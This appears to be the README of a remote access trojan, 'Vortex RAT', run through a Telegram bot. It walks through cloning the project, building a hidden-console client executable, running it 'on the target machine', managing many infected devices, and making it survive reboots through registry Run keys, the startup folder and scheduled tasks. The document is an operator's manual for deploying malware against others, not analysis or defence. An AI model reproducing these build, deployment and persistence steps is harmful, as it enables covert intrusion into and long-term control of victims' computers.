## 🚀 Quick Start

### Step 1 — Install Python

Download and install **Python 3.8+** from [python.org](https://www.python.org/downloads/)

> ⚠️ **IMPORTANT:** During installation, check ✅ **"Add Python to PATH"**

### Step 2 — Clone the Repository

```bash
git clone https://github.com/gtapiGOtLOXP/polarityrat.git
cd polarityrat
```

### Step 3 — Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 4 — Create a Telegram Bot

1. Open Telegram → search **@BotFather** → send `/newbot`
2. Follow the prompts, give your bot a name and username
3. Copy the **Bot Token** (e.g., `8551779985:AAFxIsKFSSviwldBGhk-oeqRlYSrmIV-xxx`)

### Step 5 — Get Your User ID

1. Search **@userinfobot** on Telegram → send `/start`
2. Note your numeric **User ID** (e.g., `8310686102`)

### Step 6 — Run the Builder

```bash
python builder.py
```

This opens the **Vortex RAT Builder** GUI:

1. Click the **🔨 Builder** tab
2. Paste your **Bot Token** and **User ID**
3. Customize the executable name, icon, and admin mode
4. Click **⚡ BUILD EXECUTABLE**
5. Wait 1-2 minutes — the client `.exe` appears in the `output/` folder

### Step 7 — Deploy & Connect

1. Run the built `.exe` on the target machine
2. You'll receive an automatic notification on Telegram
3. Send `/help` to see all 60+ available commands

---

## 🔨 Build Your Own Builder (Optional)

Want a standalone Builder `.exe` you can run without Python?

```bash
pip install pyinstaller
python -m PyInstaller --onefile --noconsole --clean --name "Vortex RAT Builder" --icon "rat.ico" --add-data "client.py;." --add-data "rat.ico;." builder.py
```

Your standalone builder will be in the `dist/` folder.

> **Note:** Even after compiling the builder, the machine running it still needs Python installed to compile client executables (PyInstaller requires Python).

## 📱 Multi-Device Management

Vortex RAT supports **multiple devices** running simultaneously from a single Telegram bot.

- **Unique Device ID** — Each machine gets a stable ID based on hostname, username, and MAC address
- **Device Tags** — Messages are tagged with `[HOSTNAME | username]` so you always know which device is which
- **`/devices` command** — All connected devices respond with their full info card
- **Auto-Notifications** — Every device notifies you automatically when it starts:
  - `🟢 Client Started` — fresh manual launch
  - `🔄 Machine Back Online` — after a shutdown or restart (with retry logic for network delays)

---

## 🔄 Persistence

The `/startup` command uses **4 different methods** to ensure the client survives reboots:

| Method | Scope | Admin Required |
|--------|-------|:--------------:|
| HKCU Registry Run key | Current user | ❌ |
| Startup Folder (VBS/BAT) | Current user | ❌ |
| Scheduled Task (on logon) | Current user | ❌ |
| HKLM Registry Run key | All users | ✅ |

Remove all persistence with `/rmstartup`.
